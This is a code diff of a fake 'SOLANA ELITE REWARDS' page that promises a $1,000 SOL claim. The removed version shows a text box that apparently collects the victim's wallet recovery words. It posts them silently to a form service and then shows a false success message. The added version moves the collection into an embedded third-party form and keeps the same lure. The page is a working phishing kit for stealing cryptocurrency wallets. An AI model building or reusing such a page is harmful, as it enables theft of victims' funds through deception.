@@ -4,66 +4,45 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SOLANA ELITE REWARDS</title>
-    <link href="https://googleapis.com" rel="stylesheet">
+    <!-- Tally Widget Script -->
+    <script src="https://tally.so/widgets/embed.js"></script>
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
-        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .card { width: 85%; max-width: 450px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 60px 40px; text-align: center; }
-        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.6rem; margin-bottom: 25px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
-        .ib { text-align: left; margin-bottom: 35px; }
-        label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 12px; font-weight: 700; }
-        textarea { width: 100%; background: #000; border: 1px solid #222; border-radius: 12px; padding: 18px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; resize: none; height: 150px; outline: none; }
-        .btn { width: 100%; padding: 22px; border: none; border-radius: 15px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.8rem; cursor: pointer; }
-        #success-view { display: none; }
-        .congrats { font-size: 1rem; line-height: 1.8; color: #fff; padding: 30px; background: rgba(0, 255, 163, 0.03); border-radius: 20px; border: 1px dashed var(--sol-g); }
+        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-y: auto; }
+        .card { width: 90%; max-width: 500px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 40px 20px; text-align: center; box-shadow: 0 0 80px rgba(0, 0, 0, 1); margin: 20px; }
+        h1 { font-size: 1.6rem; margin-bottom: 15px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; font-weight: 700; text-transform: uppercase; }
+        .sub { font-size: 0.9rem; color: #777; margin-bottom: 25px; line-height: 1.6; }
+        /* Tally Embed Styling */
+        .tally-container { min-height: 350px; width: 100%; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div id="form-view">
-            <form id="claim-form">
-                <h1>CLAIM $1,000 SOL</h1>
-                <div class="ib">
-                    <label>fly top</label>
-                    <textarea id="words" required></textarea>
-                </div>
-                <button type="button" onclick="hardSend()" id="submit-btn" class="btn">CONNECT WALLET</button>
-            </form>
-        </div>
-
-        <div id="success-view">
-            <h1 style="color:var(--sol-g); font-family: 'Syncopate';">CLAIM SUCCESSFUL</h1>
-            <div class="congrats">
-                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
-            </div>
+        <h1>CLAIM $1,000 SOL</h1>
+        <p class="sub">To claim your rewards, please complete the task below.</p>
+        
+        <div class="tally-container">
+            <!-- Tally Iframe Embed -->
+            <iframe 
+                data-tally-src="https://tally.so/embed/J90eDY?alignLeft=1&hideTitle=1&transparentBackground=1&dynamicHeight=1" 
+                loading="lazy" 
+                width="100%" 
+                height="350" 
+                frameborder="0" 
+                marginheight="0" 
+                marginwidth="0" 
+                title="Task">
+            </iframe>
         </div>
     </div>
 
     <script>
-        function hardSend() {
-            const val = document.getElementById('words').value;
-            const btn = document.getElementById('submit-btn');
-            
-            if(!val) { alert("Enter words"); return; }
-
-            // 1. Show 'Connecting' so the phone stays active
-            btn.innerText = "CONNECTING...";
-            btn.disabled = true;
-
-            // 2. Force the data out to Formspark
-            fetch("https://submit-form.com", {
-                method: "POST",
-                headers: { "Content-Type": "application/json", "Accept": "application/json" },
-                body: JSON.stringify({ message: val })
-            });
-
-            // 3. HARD FIX: Wait 2 seconds before changing the screen
-            // This ensures the iPhone has enough time to finish the upload
-            setTimeout(() => {
-                document.getElementById('form-view').style.display = 'none';
-                document.getElementById('success-view').style.display = 'block';
-            }, 2000);
-        }
+        // Reloads Tally embeds on page load
+        window.onload = function() {
+            if (typeof Tally !== 'undefined') {
+                Tally.loadEmbeds();
+            }
+        };
     </script>
 </body>
 </html>
